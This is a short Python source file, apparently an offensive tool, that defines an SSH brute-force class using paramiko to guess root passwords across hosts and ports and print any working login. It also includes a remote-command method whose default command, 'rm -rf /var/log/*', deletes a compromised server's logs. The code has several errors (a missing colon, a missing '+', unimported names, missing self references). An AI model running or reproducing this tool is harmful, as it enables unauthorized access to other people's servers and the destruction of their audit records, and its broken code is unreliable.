import paramiko

class sshBruteForce():
	def __init__(self):
		self.hostnames = []
		self.target_ports = ['22']
		self.usernames = ['root']
		self.passwords = []

	# send remote commands to a server. Default command is rm -rf logs
	def remote_command(server, username, password, cmd_to_execute=None)
		if (cmd_to_execute == None):
			cmd_to_execute = "rm -rf /var/log/*"
		ssh = paramiko.SSHClient()
		ssh.connect(server, username=username, password=password)
		ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmd_to_execute)
		ssh.close()

	def bf_single_target(self):
		for ip in hostnames:
			for port in target_ports:
				for username in self.usernames:
					for password in self.passwords:
						connect = create_ssh_session(username, password, ip, port)
						if (connect == True):
							print("Successful brute force!")
							print("hostname: " + ip + ":" + port "\nu: " + username + "\np: " + password)
							sys.exit(0)
						else:
							pass
				

	def create_ssh_session(self, username, password, hostname, port_num):
		ssh = paramiko.SSHClient()
		try:
			ssh.connect(hostname=hostname, port=port_num, username=username, password=password)
			return True
		except (BadHostKeyException, AuthenticationException, SSHException, socket.error) as e:
			return False
